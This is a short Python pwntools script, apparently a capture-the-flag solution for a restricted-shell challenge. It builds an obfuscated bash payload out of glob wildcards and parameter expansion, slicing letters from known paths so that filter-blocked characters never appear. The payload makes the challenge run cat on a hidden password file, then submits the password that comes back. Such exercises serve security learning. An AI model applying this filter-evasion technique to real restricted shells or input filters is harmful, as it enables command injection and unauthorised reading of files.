#!/usr/bin/env python

from pwn import *

strings = {
    '???????': 'flagbox',
    '.????????????': '.bash_history',
    '????/??': 'jail/ls',
    '????/???': 'jail/cat',
    '/?????': '/media',
    '/???????': '/vmlinuz',
    '/???/???': '/var/www',
    '/???/???????': '/var/backups',
    '/???/????-????': '/etc/qemu-ifup'
}


def num(n):
    if n == 0:
        return "(($#-$#))"
    return "((%s))" % ('-~($#-$#)' * n)


def abc(c):
    for k, v in strings.iteritems():
        if c in v:
            return ';%s;____=${_:%s:%s}' % (k, num(v.index(c)), num(1))
    return None


def append_payload(c):
    if '0' <= c <= '9':
        return ';___=$___$'+num(ord(c)-ord('0'))
    else:
        return '%s;___=$___${____^}' % abc(c.lower())

p = remote('localhost', 9023)

p.recvuntil('your password is in ')
filename = p.recvline()[8:-1]

log.info('Filename is %s' % filename)

payload = '????/???;__=${_:%s}' % num(5)  # __=cat
payload += ';???????;___=$_/'  # ___=flagbox/

for c in filename:
    payload += append_payload(c)

payload += ';$__<$___'

# log.info(payload)

p.recvuntil('cmd3$ ')
p.sendline(payload)

password = p.recvuntil('cmd3$ ')[-38:-6]
log.success('Password is %s' % password)

p.sendline(password)

print p.recvall()
